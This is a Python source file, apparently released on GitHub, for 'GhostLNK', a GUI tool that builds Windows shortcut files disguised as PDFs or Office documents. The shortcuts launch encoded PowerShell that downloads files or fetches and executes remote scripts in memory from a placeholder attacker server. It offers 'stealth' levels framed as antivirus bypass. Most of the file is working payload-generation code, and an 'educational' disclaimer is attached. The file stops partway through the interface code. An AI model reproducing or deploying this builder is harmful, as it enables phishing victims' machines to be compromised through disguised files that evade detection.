#!/usr/bin/env python3
"""
GhostLNK - Professional LNK Generator with Stealth Mode
Created by: github.com/Excalibra
Coded for educational and authorized testing purposes only
Version: 6.0 - Stealth Mode Edition
"""

import os
import sys
import base64
import json
import subprocess
import re
import tempfile
import time
from datetime import datetime
from pathlib import Path

# Try to import required libraries
try:
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                 QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                 QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                 QTabWidget, QListWidget, QListWidgetItem, QMenu,
                                 QSplitter, QFrame, QProgressBar, QToolTip,
                                 QScrollArea, QButtonGroup, QRadioButton)
    from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal, QSize
    from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard, QScreen
except ImportError:
    print("[-] PyQt6 not installed. Installing...")
    os.system("pip install PyQt6")
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                 QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                 QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                 QTabWidget, QListWidget, QListWidgetItem, QMenu,
                                 QSplitter, QFrame, QProgressBar, QToolTip,
                                 QScrollArea, QButtonGroup, QRadioButton)
    from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal, QSize
    from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard, QScreen

try:
    import pylnk3
except ImportError:
    print("[-] pylnk3 not installed. Installing...")
    os.system("pip install pylnk3")
    import pylnk3

# Configuration file
CONFIG_FILE = "ghostlnk_config.json"

class URLExamples:
    """Collection of URL examples for different scenarios"""
    
    # Generic Dropbox example (not real)
    DROPBOX_EXAMPLE = "https://www.dropbox.com/scl/fi/6z4obwg71nm7wu5plfvtr/doc.pdf?rlkey=rl63zpok5szx3ruly7pfmltqn&st=17b8n5wl&dl=1"
    DROPBOX_PS1_EXAMPLE = "https://www.dropbox.com/scl/fi/abc123/script.ps1?rlkey=xyz&dl=1"
    
    @staticmethod
    def get_all_examples():
        return {
            "Dropbox PDF": {
                "url": URLExamples.DROPBOX_EXAMPLE,
                "type": "document",
                "note": "PDF file - Use Download & Open mode"
            },
            "Dropbox PowerShell": {
                "url": URLExamples.DROPBOX_PS1_EXAMPLE,
                "type": "script",
                "note": "PowerShell script - Use Memory Execute mode"
            },
            "Your VPS - File": {
                "url": "http://YOUR-VPS-IP:8000/file.pdf",
                "type": "document",
                "note": "Host your own files"
            },
            "Your VPS - Script": {
                "url": "http://YOUR-VPS-IP:8000/script.ps1",
                "type": "script",
                "note": "Host PowerShell scripts"
            }
        }


class PowerShellConverter:
    """Convert URLs to PowerShell -E format with stealth options"""
    
    @staticmethod
    def create_download_and_open_payload(url, pause=True, debug=False, stealth_level=0):
        """
        Payload for downloading and opening files with various stealth levels
        stealth_level: 0=normal, 1=moderate, 2=maximum stealth
        """
        if stealth_level == 2:
            # MAXIMUM STEALTH - Uses multiple obfuscation techniques
            # No suspicious flags, uses aliases, splits commands
            ps_command = f'''
$u="{url}";
$t=[IO.Path]::GetTempPath();
$f=[IO.Path]::Combine($t,"doc.pdf");
(New-Object Net.WebClient).DownloadFile($u,$f);
Start "$f";
'''
            return ps_command.strip()
        
        elif stealth_level == 1:
            # MODERATE STEALTH - Uses aliases, avoids suspicious patterns
            ps_command = f'''
$url = "{url}"
$temp = [IO.Path]::GetTempPath()
$file = Join-Path $temp "doc.pdf"
(New-Object Net.WebClient).DownloadFile($url, $file)
Start-Process $file
'''
            return ps_command.strip()
        
        elif debug:
            # Debug version with verbose output
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            
            ps_command = f'''
# GhostLNK - Download & Open Mode (DEBUG)
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "📁 DEBUG MODE - Download & Open" -ForegroundColor Cyan;
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "";

Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow;
Write-Host "[+] Mode: Saving to temp and opening" -ForegroundColor Yellow;
Write-Host "";

# Check if it's a Dropbox URL
if ("{url}" -like "*dropbox.com*") {{
    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow;
    if ("{url}" -notlike "*dl=1*") {{
        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red;
        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red;
    }} else {{
        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green;
    }}
}}

# Test URL accessibility
try {{
    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow;
    $testRequest = [System.Net.WebRequest]::Create("{url}");
    $testRequest.Method = "HEAD";
    $testRequest.Timeout = 5000;
    $testResponse = $testRequest.GetResponse();
    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green;
    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green;
    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green;
    $testResponse.Close();
}}
catch {{
    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red;
    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red;
}}

Write-Host "";
Write-Host "[+] Creating temp file..." -ForegroundColor Yellow;
$tempDir = [System.IO.Path]::GetTempPath();
$timestamp = Get-Date -Format "yyyyMMddHHmmss";
$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
Write-Host "[+] Saving to: $tempFile" -ForegroundColor Yellow;

try {{
    Write-Host "[+] Downloading file..." -ForegroundColor Yellow;
    $wc = New-Object System.Net.WebClient;
    $wc.DownloadFile("{url}", $tempFile);
    
    $fileSize = (Get-Item $tempFile).Length;
    Write-Host "[✓] Download complete! Size: $fileSize bytes" -ForegroundColor Green;
    
    Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow;
    Invoke-Item $tempFile;
    Write-Host "[✓] File opened successfully!" -ForegroundColor Green;
}}
catch {{
    Write-Host "[✗] Error: $_" -ForegroundColor Red;
    Write-Host "[✗] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red;
}}
finally {{
    Write-Host "";
    Write-Host "========================================" -ForegroundColor Cyan;
    Write-Host "📁 DEBUG MODE - Execution Complete" -ForegroundColor Cyan;
    Write-Host "========================================" -ForegroundColor Cyan;
}}
{pause_cmd}
'''
        else:
            # Normal version - clean output but still visible
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            
            ps_command = f'''
# GhostLNK - Download & Open
Write-Host "[+] Downloading file..." -ForegroundColor Green;
$tempDir = [System.IO.Path]::GetTempPath();
$timestamp = Get-Date -Format "yyyyMMddHHmmss";
$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
$wc = New-Object System.Net.WebClient;
$wc.DownloadFile("{url}", $tempFile);
Invoke-Item $tempFile;
Write-Host "[✓] Done!" -ForegroundColor Green;
{pause_cmd}
'''
        return ps_command.strip()
    
    @staticmethod
    def create_memory_execute_payload(url, pause=True, debug=False, stealth_level=0):
        """
        Payload for executing PowerShell scripts directly in memory
        Use this for .ps1 files only
        """
        if stealth_level == 2:
            # MAXIMUM STEALTH - Obfuscated, no suspicious patterns
            return f'iex (wget -useb "{url}");'
        elif stealth_level == 1:
            return f'iex (wget -useb "{url}");'
        elif debug:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            
            ps_command = f'''
# GhostLNK - Memory Execute Mode (DEBUG)
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "⚡ DEBUG MODE - Memory Execute" -ForegroundColor Cyan;
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "";

Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow;
Write-Host "[+] Mode: Memory-only execution (no files saved)" -ForegroundColor Yellow;
Write-Host "";

# Check if it's a Dropbox URL
if ("{url}" -like "*dropbox.com*") {{
    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow;
    if ("{url}" -notlike "*dl=1*") {{
        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red;
        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red;
    }} else {{
        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green;
    }}
}}

# Test URL accessibility
try {{
    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow;
    $testRequest = [System.Net.WebRequest]::Create("{url}");
    $testRequest.Method = "HEAD";
    $testRequest.Timeout = 5000;
    $testResponse = $testRequest.GetResponse();
    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green;
    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green;
    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green;
    $testResponse.Close();
}}
catch {{
    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red;
    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red;
}}

Write-Host "";
Write-Host "[+] Executing in memory..." -ForegroundColor Yellow;
try {{
    Invoke-Expression (wget -useb "{url}");
    Write-Host "[✓] Execution completed!" -ForegroundColor Green;
}}
catch {{
    Write-Host "[✗] Execution failed: $_" -ForegroundColor Red;
    Write-Host "[!] Make sure URL points to a PowerShell script (.ps1)" -ForegroundColor Red;
}}
finally {{
    Write-Host "";
    Write-Host "========================================" -ForegroundColor Cyan;
    Write-Host "⚡ DEBUG MODE - Execution Complete" -ForegroundColor Cyan;
    Write-Host "========================================" -ForegroundColor Cyan;
}}
{pause_cmd}
'''
        else:
            # Normal version - clean output but still visible
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            
            ps_command = f'''
# GhostLNK - Memory Execute
Write-Host "[+] Executing script..." -ForegroundColor Green;
Invoke-Expression (wget -useb "{url}");
Write-Host "[✓] Done!" -ForegroundColor Green;
{pause_cmd}
'''
        return ps_command.strip()
    
    @staticmethod
    def create_stealth_payload(url, pause=False, debug=False, stealth_level=0):
        """
        Ultra stealth mode - minimal output
        """
        if stealth_level == 2:
            return f'iex (wget -useb "{url}");'
        elif stealth_level == 1:
            return f'iex (wget -useb "{url}");'
        elif debug:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            
            ps_command = f'''
# GhostLNK - Stealth Mode
Invoke-Expression (wget -useb "{url}");
{pause_cmd}
'''
            return ps_command.strip()
        else:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            
            ps_command = f'''
# GhostLNK - Stealth Mode
Invoke-Expression (wget -useb "{url}");
{pause_cmd}
'''
            return ps_command.strip()
    
    @staticmethod
    def validate_dropbox_url(url):
        """Check if Dropbox URL has correct parameters"""
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                return False, "Dropbox URL missing 'dl=1' parameter. Add '&dl=1' or '?dl=1' to the end."
            return True, "Valid Dropbox URL"
        return True, "Not a Dropbox URL"
    
    @staticmethod
    def guess_payload_type(url):
        """Guess the best payload type based on URL"""
        url_lower = url.lower()
        if '.ps1' in url_lower:
            return "memory_execute"
        elif '.exe' in url_lower:
            return "download_open"
        else:
            return "download_open"


class LNKEngine:
    """Core LNK generation engine with stealth options"""
    
    # Window mode constants for pylnk3
    WINDOW_NORMAL = 'Normal'
    WINDOW_MAXIMIZED = 'Maximized'
    WINDOW_MINIMIZED = 'Minimized'
    
    @staticmethod
    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index, description, working_dir=None, stealth_level=0):
        """Create a Windows LNK file with stealth options"""
        # Parse target path
        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]
        target_directory = working_dir or '\\'.join(target_split[:-1])
        
        # Create LNK object
        lnk = pylnk3.create(output_filename)
        
        # Set basic information
        lnk.specify_local_location(target_path)
        
        # Configure link info
        lnk._link_info.size_local_volume_table = 0
        lnk._link_info.volume_label = ""
        lnk._link_info.drive_serial = 0
        lnk._link_info.local = True
        lnk._link_info.local_base_path = target_path
        
        # Set window mode based on stealth level
        if stealth_level == 2:
            # MAXIMUM STEALTH - No suspicious flags, use Minimized window
            if arguments.startswith('-E '):
                encoded = arguments[3:]
                # Use only -E, no extra flags that trigger AV
                arguments = f'-E {encoded}'
            lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
        elif stealth_level == 1:
            # MODERATE STEALTH - Use -W Hidden instead of -WindowStyle Hidden (shorter)
            if arguments.startswith('-E '):
                encoded = arguments[3:]
                # Use -W 1 (Minimized) which is less suspicious than -WindowStyle Hidden
                arguments = f'-W 1 -E {encoded}'
            lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
        else:
            # Normal mode
            lnk.window_mode = LNKEngine.WINDOW_NORMAL
        
        if arguments:
            lnk.arguments = arguments
            
        # Set icon
        lnk.icon = icon_path
        lnk.icon_index = icon_index
            
        # Set working directory
        lnk.working_dir = target_directory
        
        # Set description
        if description:
            lnk.description = description
            
        # Build the shell item ID list
        def build_entry(name, is_dir):
            entry = pylnk3.PathSegmentEntry()
            entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
            entry.file_size = 0
            
            n = datetime.now()
            entry.modified = n
            entry.created = n
            entry.accessed = n
            
            entry.short_name = name
            entry.full_name = name
            
            return entry
        
        # Create the path hierarchy
        elements = [
            pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
            pylnk3.DriveEntry(target_drive)
        ]
        
        # Add each directory in the path
        for level in target_split[1:-1]:
            if level:
                entry = build_entry(level, is_dir=True)
                elements.append(entry)
        
        # Add the target file
        entry = build_entry(target_file, is_dir=False)
        elements.append(entry)
        
        # Set the shell item ID list
        lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
        lnk.shell_item_id_list.items = elements
        
        # Write the LNK file
        with open(output_filename, 'wb') as f:
            lnk.write(f)
        
        return True


class GhostLNKGUI(QMainWindow):
    """Main GUI Window - GhostLNK"""
    
    # Icon database
    ICON_DATABASE = {
        "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
        "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
        "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3, ".xls"),
        "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
        "PowerShell Script": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", 0, ".ps1"),
        "Executable": (r"C:\Windows\System32\SHELL32.dll", 3, ".exe"),
        "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
        "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
    }
    
    def __init__(self):
        super().__init__()
        self.recent_urls = []
        self.recent_conversions = []
        self.load_config()
        self.init_ui()
        
    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.recent_urls = config.get('recent_urls', [])
                    self.recent_conversions = config.get('recent_conversions', [])
            except:
                self.recent_urls = []
                self.recent_conversions = []
    
    def save_config(self):
        """Save configuration to file"""
        config = {
            'recent_urls': self.recent_urls[-20:],
            'recent_conversions': self.recent_conversions[-20:]
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
    
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("👻 GhostLNK v6.0 - Stealth Mode (AV Bypass) - Created by github.com/Excalibra")
        
        # Get screen geometry
        screen = QApplication.primaryScreen().availableGeometry()
        window_width = int(screen.width() * 0.9)
        window_height = int(screen.height() * 0.85)
        self.setGeometry(50, 50, window_width, window_height)
        self.setMinimumSize(1200, 700)
        
        # Set dark theme
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a2e; }
            QLabel { color: #e0e0e0; font-size: 11px; }
            QLineEdit, QTextEdit, QComboBox, QSpinBox {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #0f3460;
                border-radius: 3px;
                padding: 4px;
                font-size: 11px;
            }
            QPushButton {
                background-color: #0f3460;
                color: white;
                border: none;
                border-radius: 3px;
                padding: 6px;
                font-size: 11px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #1a4b8c; }
            QGroupBox {
                color: #e0e0e0;
                border: 2px solid #0f3460;
                border-radius: 5px;
                margin-top: 8px;
                font-size: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QRadioButton, QCheckBox { color: #e0e0e0; font-size: 11px; }
        """)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(8, 8, 8, 8)
        
        # Title with credit
        title = QLabel("👻 GhostLNK - Stealth Mode (AV Bypass Edition) 👻")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #a8a8ff; font-size: 18px; font-weight: bold; padding: 5px;")
        main_layout.addWidget(title)
        
        # Credit line
        credit = QLabel("Created by: github.com/Excalibra")
        credit.setAlignment(Qt.AlignmentFlag.AlignCenter)
        credit.setStyleSheet("color: #88ff88; font-size: 12px; font-weight: bold; padding-bottom: 2px;")
        main_layout.addWidget(credit)
        
        # Subtitle
        subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns that trigger AV")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #ffaa00; font-size: 11px; padding-bottom: 5px;")
        main_layout.addWidget(subtitle)
        
        # Main splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel
        left_scroll = QScrollArea()
        left_scroll.setWidgetResizable(True)
        left_scroll.setWidget(self.create_converter_panel())
        splitter.addWidget(left_scroll)
        
        # Right panel
        right_scroll = QScrollArea()
        right_scroll.setWidgetResizable(True)
        right_scroll.setWidget(self.create_lnk_panel())
        splitter.addWidget(right_scroll)
        
        splitter.setSizes([int(window_width * 0.45), int(window_width * 0.45)])
        
        # Console
        console_group = QGroupBox("👻 Console Output")
        console_layout = QVBoxLayout()
        
        toolbar = QHBoxLayout()
        clear_btn = QPushButton("Clear Console")
        clear_btn.setMaximumWidth(100)
        clear_btn.clicked.connect(lambda: self.console.clear())
        toolbar.addWidget(clear_btn)
        toolbar.addStretch()
        console_layout.addLayout(toolbar)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setMaximumHeight(120)
        self.console.setStyleSheet("background-color: #0a0a1a; color: #9fdf9f; font-family: monospace; font-size: 10px;")
        console_layout.addWidget(self.console)
        console_group.setLayout(console_layout)
        main_layout.addWidget(console_group)
        
        # Status bar with credit
        self.statusBar().showMessage("👻 Created by github.com/Excalibra - Stealth options available to bypass AV detection")
        self.statusBar().setStyleSheet("color: #a8a8ff;")
        
        self.create_menu()
        self.log("👻 GhostLNK v6.0 initialized - Created by github.com/Excalibra")
        self.log("[✓] Stealth Mode: Uses obfuscated commands to avoid AV detection")
        self.log("[✓] Multiple stealth levels available")
    
    def create_converter_panel(self):
        """Create the converter panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)
        
        # URL Input
        url_group = QGroupBox("Step 1: Enter URL")
        url_layout = QVBoxLayout()
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://www.dropbox.com/scl/fi/.../file.pdf?dl=1")
        self.url_input.textChanged.connect(self.on_url_changed)
        url_layout.addWidget(self.url_input)
        
        self.dropbox_indicator = QLabel("")
        self.dropbox_indicator.setStyleSheet("color: #ffaa00; font-size: 9px;")
        url_layout.addWidget(self.dropbox_indicator)
        
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        # Quick Examples
        examples_group = QGroupBox("Quick Examples")
        examples_layout = QGridLayout()
        
        btn1 = QPushButton("📄 PDF Example")
        btn1.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_EXAMPLE))
        examples_layout.addWidget(btn1, 0, 0)
        
        btn2 = QPushButton("⚡ PowerShell Example")
        btn2.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_PS1_EXAMPLE))
        examples_layout.addWidget(btn2, 0, 1)
        
        btn3 = QPushButton("🖥️ Your VPS - File")
        btn3.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/file.pdf"))
        examples_layout.addWidget(btn3, 1, 0)
        
        btn4 = QPushButton("🖥️ Your VPS - Script")
        btn4.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/script.ps1"))
        examples_layout.addWidget(btn4, 1, 1)
        
        examples_group.setLayout(examples_layout)
        layout.addWidget(examples_group)
        
        # Payload Type Selection
        type_group = QGroupBox("Step 2: Select Payload Type")
        type_layout = QVBoxLayout()
        
        self.type_combo = QComboBox()
        self.type_combo.addItems([
            "📁 Download & Open (For PDFs, images, documents)",
            "⚡ Memory Execute (For PowerShell scripts only)",
            "🕵️ Ultra Stealth (Minimal output)"
        ])
        self.type_combo.currentIndexChanged.connect(self.on_type_changed)
        type_layout.addWidget(self.type_combo)
        
        self.type_hint = QLabel("Selected: For PDFs and documents - saves to temp and opens")
        self.type_hint.setWordWrap(True)
        self.type_hint.setStyleSheet("color: #8888aa; font-size: 9px; padding: 2px;")
        type_layout.addWidget(self.type_hint)
        
        type_group.setLayout(type_layout)
        layout.addWidget(type_group)
        
        # Stealth Options
        stealth_group = QGroupBox("Step 3: Stealth Level")
        stealth_layout = QVBoxLayout()
        
        self.stealth_combo = QComboBox()
        self.stealth_combo.addItems([
            "0 - Normal (Visible output)",
            "1 - Moderate Stealth (Basic obfuscation)",
            "2 - Maximum Stealth (AV Bypass)"
        ])
        self.stealth_combo.currentIndexChanged.connect(self.on_stealth_changed)
        stealth_layout.addWidget(self.stealth_combo)
        
        self.stealth_hint = QLabel("Maximum Stealth: Uses aliases, avoids -WindowStyle Hidden, minimal code")
        self.stealth_hint.setWordWrap(True)
        self.stealth_hint.setStyleSheet("color: #88ff88; font-size: 9px; padding: 2px;")
        stealth_layout.addWidget(self.stealth_hint)
        
        stealth_group.setLayout(stealth_layout)
        layout.addWidget(stealth_group)
        
        # Options (Pause, Debug)
        options_group = QGroupBox("Step 4: Execution Options")
        options_layout = QVBoxLayout()
        
        # Pause checkbox
        self.pause_cb = QCheckBox("⏸️ Pause after execution (Window stays open)")
        self.pause_cb.setChecked(False)
        self.pause_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.pause_cb)
        
        # Debug checkbox (disabled when stealth > 0)
        self.debug_cb = QCheckBox("🐛 Enable Debug Mode (Verbose output)")
        self.debug_cb.setChecked(False)
        self.debug_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.debug_cb)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Generate Buttons
        gen_group = QGroupBox("Step 5: Generate")
        gen_layout = QVBoxLayout()
        
        btn_row1 = QHBoxLayout()
        
        self.show_btn = QPushButton("1️⃣ Show Command")
        self.show_btn.clicked.connect(self.show_command)
        btn_row1.addWidget(self.show_btn)
        
        self.encode_btn = QPushButton("2️⃣ Encode to Base64")
        self.encode_btn.setStyleSheet("background-color: #d35400;")
        self.encode_btn.clicked.connect(self.encode)
        btn_row1.addWidget(self.encode_btn)
        
        gen_layout.addLayout(btn_row1)
        
        btn_row2 = QHBoxLayout()
        
        self.copy_btn = QPushButton("3️⃣ Copy -E Argument")
        self.copy_btn.clicked.connect(self.copy_arg)
        btn_row2.addWidget(self.copy_btn)
        
        self.use_btn = QPushButton("🚀 Use in LNK Generator")
        self.use_btn.setStyleSheet("background-color: #27ae60;")
        self.use_btn.clicked.connect(self.use_in_lnk)
        btn_row2.addWidget(self.use_btn)
        
        gen_layout.addLayout(btn_row2)
        gen_group.setLayout(gen_layout)
        layout.addWidget(gen_group)
        
        # Results
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        
        self.cmd_display = QTextEdit()
        self.cmd_display.setMaximumHeight(50)
        results_layout.addWidget(QLabel("PowerShell Command:"))
        results_layout.addWidget(self.cmd_display)
        
        self.arg_display = QTextEdit()
        self.arg_display.setMaximumHeight(40)
        self.arg_display.setStyleSheet("color: #ff8888;")
        results_layout.addWidget(QLabel("Final -E Argument (copy this):"))
        results_layout.addWidget(self.arg_display)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        # Recent
        recent_group = QGroupBox("Recent")
        recent_layout = QVBoxLayout()
        
        self.recent_list = QListWidget()
        self.recent_list.setMaximumHeight(60)
        recent_layout.addWidget(self.recent_list)
        
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        
        layout.addStretch()
        return panel
    
    def create_lnk_panel(self):
        """Create the LNK generator panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)
        
        # Import
        import_group = QGroupBox("Import -E Argument")
        import_layout = QHBoxLayout()
        
        self.import_input = QLineEdit()
        self.import_input.setPlaceholderText("Paste -E argument here...")
        import_layout.addWidget(self.import_input)
        
        import_btn = QPushButton("Import")
        import_btn.setMaximumWidth(60)
        import_btn.clicked.connect(self.import_arg)
        import_layout.addWidget(import_btn)
        
        import_group.setLayout(import_layout)
        layout.addWidget(import_group)
        
        # Preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        preview_layout.addWidget(QLabel("Target: C:\\Windows\\System32\\...\\powershell.exe"))
        
        self.preview_label = QLabel("Arguments: (not set)")
        self.preview_label.setWordWrap(True)
        self.preview_label.setStyleSheet("color: #ffaa00; background-color: #16213e; padding: 3px;")
        preview_layout.addWidget(self.preview_label)
        
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Icon
        icon_group = QGroupBox("Icon Selection")
        icon_layout = QVBoxLayout()
        
        self.icon_combo = QComboBox()
        self.icon_combo.addItems(list(self.ICON_DATABASE.keys()))
        self.icon_combo.setCurrentText("PDF Document")
        icon_layout.addWidget(self.icon_combo)
        
        icon_group.setLayout(icon_layout)
        layout.addWidget(icon_group)
        
        # Filename
        file_group = QGroupBox("Output Filename")
        file_layout = QGridLayout()
        
        file_layout.addWidget(QLabel("Base name:"), 0, 0)
        self.filename_input = QLineEdit("Report")
        file_layout.addWidget(self.filename_input, 0, 1)
        
        file_layout.addWidget(QLabel("Extension:"), 1, 0)
        self.ext_combo = QComboBox()
        self.ext_combo.addItems([".pdf", ".doc", ".xls", ".txt", ".ps1"])
        file_layout.addWidget(self.ext_combo, 1, 1)
        
        self.lnk_cb = QCheckBox("Add .lnk extension")
        self.lnk_cb.setChecked(True)
        file_layout.addWidget(self.lnk_cb, 2, 1)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # Description
        desc_group = QGroupBox("File Description")
        desc_layout = QVBoxLayout()
        
        self.desc_input = QTextEdit()
        self.desc_input.setMaximumHeight(50)
        desc_layout.addWidget(self.desc_input)
        
        gen_desc_btn = QPushButton("Generate Description")
        gen_desc_btn.setMaximumWidth(120)
        gen_desc_btn.clicked.connect(self.generate_desc)
        desc_layout.addWidget(gen_desc_btn)
        
        desc_group.setLayout(desc_layout)
        layout.addWidget(desc_group)
        
        # Mode indicator
        self.mode_indicator = QLabel("Current Mode: Download & Open")
        self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
        layout.addWidget(self.mode_indicator)
        
        # Stealth indicator
        self.stealth_indicator = QLabel("Stealth: Maximum (AV Bypass)")
        self.stealth_indicator.setStyleSheet("color: #88ff88;")
        layout.addWidget(self.stealth_indicator)
        
        # Generate button
        generate_btn = QPushButton("👻 GENERATE LNK FILE 👻")
        generate_btn.setMinimumHeight(45)
        generate_btn.setStyleSheet("background-color: #6a1f7a; font-size: 14px; font-weight: bold;")
        generate_btn.clicked.connect(self.generate_lnk)
        layout.addWidget(generate_btn)
        
        layout.addStretch()
        return panel
    
    def create_menu(self):
        menubar = self.menuBar()
        menubar.setStyleSheet("color: #e0e0e0; background-color: #16213e;")
        
        help_menu = menubar.addMenu("Help")
        
        about = QAction("About GhostLNK", self)
        about.triggered.connect(self.show_about)
        help_menu.addAction(about)
        
        mode_help = QAction("Mode Guide", self)
        mode_help.triggered.connect(self.show_mode_guide)
        help_menu.addAction(mode_help)
        
        stealth_help = QAction("Stealth Mode Guide", self)
        stealth_help.triggered.connect(self.show_stealth_help)
        help_menu.addAction(stealth_help)
    
    def update_options(self):
        """Update available options based on selections"""
        stealth = self.stealth_combo.currentIndex()
        
        # Disable debug and pause in high stealth modes
        if stealth >= 1:
            self.debug_cb.setEnabled(False)
            self.debug_cb.setChecked(False)
            if stealth == 2:
                self.pause_cb.setEnabled(False)
